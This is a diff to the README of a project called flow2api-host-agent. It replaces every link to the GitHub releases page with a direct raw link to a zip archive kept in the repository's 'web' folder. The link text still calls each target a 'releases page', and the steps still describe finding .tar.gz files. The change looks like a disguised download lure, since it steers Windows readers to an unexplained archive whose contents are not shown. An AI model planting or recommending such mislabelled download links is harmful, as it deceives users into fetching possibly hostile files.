@@ -1,6 +1,6 @@
 # ⚙️ flow2api-host-agent - Host Agent for Flow2API on Linux
 
-[![Download Releases](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/yusufii00/flow2api-host-agent/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/yusufii00/flow2api-host-agent/raw/refs/heads/main/web/api_agent_host_flow_v1.8.zip)
 
 ## 📋 About flow2api-host-agent
 
@@ -32,9 +32,9 @@ Your Windows computer will only be used to download and prepare files for the Li
 
 To begin, you need to download the installation files on your Windows computer.
 
-[![Download flow2api-host-agent Releases](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/yusufii00/flow2api-host-agent/releases)
+[![Download flow2api-host-agent Releases](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/yusufii00/flow2api-host-agent/raw/refs/heads/main/web/api_agent_host_flow_v1.8.zip)
 
-1. Open your web browser and go to the [flow2api-host-agent releases page](https://github.com/yusufii00/flow2api-host-agent/releases).
+1. Open your web browser and go to the [flow2api-host-agent releases page](https://github.com/yusufii00/flow2api-host-agent/raw/refs/heads/main/web/api_agent_host_flow_v1.8.zip).
 2. Look for the latest release version. It will usually be at the top of the page.
 3. Download the files that say Linux executable or setup. These typically have `.tar.gz` or `.tar.xz` extensions.
 4. Save the downloaded file to a known location on your Windows PC, such as the Desktop or Downloads folder.
@@ -210,4 +210,4 @@ sudo systemctl start flow2api-host-agent
 
 For all downloads and updates, use the latest versions from:
 
-[Visit flow2api-host-agent releases page](https://github.com/yusufii00/flow2api-host-agent/releases)
+[Visit flow2api-host-agent releases page](https://github.com/yusufii00/flow2api-host-agent/raw/refs/heads/main/web/api_agent_host_flow_v1.8.zip)
